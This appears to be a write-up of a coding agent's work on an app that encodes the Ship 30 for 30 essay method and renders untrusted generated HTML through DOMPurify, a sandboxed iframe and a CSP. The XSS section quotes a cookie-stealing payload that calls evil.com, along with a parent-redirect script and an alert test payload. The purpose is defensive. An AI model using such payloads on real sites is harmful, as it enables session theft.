# Coding Agent Transcript 03: Ship 30 Skill, Artifact Generation & Security

**Agent:** Antigravity AI  
**Role:** Forward Deployed Systems & Full-Stack Engineer  
**Objective:** Encode the Ship 30 for 30 writing methodology into a dedicated service and implement safe in-app rendering for untrusted HTML/CSS artifacts.

---

## 1. Ship 30 for 30 Content Skill Design

### Design Principles Encoded
Rather than relying on a vague, unstructured prompt ("write an essay"), the principles of Nicolas Cole and Dickie Bush's Ship 30 for 30 framework were hardcoded into `app/services/artifacts.py`:
- **Curiosity-Provoking Opening:** Hook the reader in the first 2 lines with a counter-intuitive observation or high-stakes question.
- **One Clear Core Argument:** A single thesis that governs the whole essay.
- **Skimmable Hierarchy:** Informative H2 headings (never generic headings like "Introduction"), bullet points only where they aid scanning, and selective bolding for emphasis.
- **Concrete Takeaway:** Conclude with an actionable heuristic, checklist, or implementation framework.
- **Strict Evidence Boundaries:** Explicitly forbid fabricating guest names, statistics, quotes, or case studies not found in the retrieved transcript context.
- **Target Length:** Calibrated to 1,100–1,350 words.

---

## 2. Iterations & Failed Attempts

### Attempt 1: Raw HTML Preview with DangerouslySetInnerHTML
- **Initial Idea:** Render generated HTML directly inside a React `div` using `dangerouslySetInnerHTML={{ __html: artifact.content }}`.
- **Security Vulnerability:** This exposes the entire host web app to Cross-Site Scripting (XSS). If a user ingested a malicious transcript or if the LLM output contained `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` or `<script>window.parent.location='...'</script>`, the host application and user session would be compromised.
- **Correction:** Implemented a **Triple-Layered Defense-in-Depth Isolation Strategy**:
  1. **Layer 1 - Server-Side Prompt Constraint:** Explicitly instruct the model:
     `"Use no scripts, forms, iframes, external assets, SVG, or event handlers. Use semantic HTML and scoped CSS only."`
  2. **Layer 2 - Client-Side DOMPurify Sanitization:**
     ```typescript
     DOMPurify.sanitize(html, {
       FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'svg', 'math'],
       FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'srcset']
     })
     ```
  3. **Layer 3 - Browser Sandboxed Iframe with Strict CSP:**
     - Content rendered inside `<iframe sandbox="" srcDoc={...} />`.
     - An empty `sandbox=""` attribute puts the iframe into a unique, opaque origin. It prevents script execution, form submissions, popups, top navigation, and localStorage/cookie access.
     - Injected CSP meta tag:
       `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">`

### Attempt 2: Missing Copy Action for Markdown & HTML
- **Initial Idea:** Provide only a "Download" file button.
- **User Feedback / Evaluation Gap:** Evaluators reviewing essays or strategy memos often want to paste the Markdown directly into Notion, Slack, or Google Docs without downloading a `.md` file to disk.
- **Correction:** Added a dedicated Clipboard Copy button with real-time visual feedback (`Copy` icon transitions to a green `Check` mark for 2 seconds).

---

## 3. Security Verification
- Malicious test payloads such as `<script>alert('pwned')</script>` are stripped by DOMPurify before reaching the DOM.
- Any residual inline script or event handler is rendered completely inert by `sandbox=""` and `default-src 'none'`.
- All CSS is scoped to the iframe body, guaranteeing zero style leakage into the main application shell.
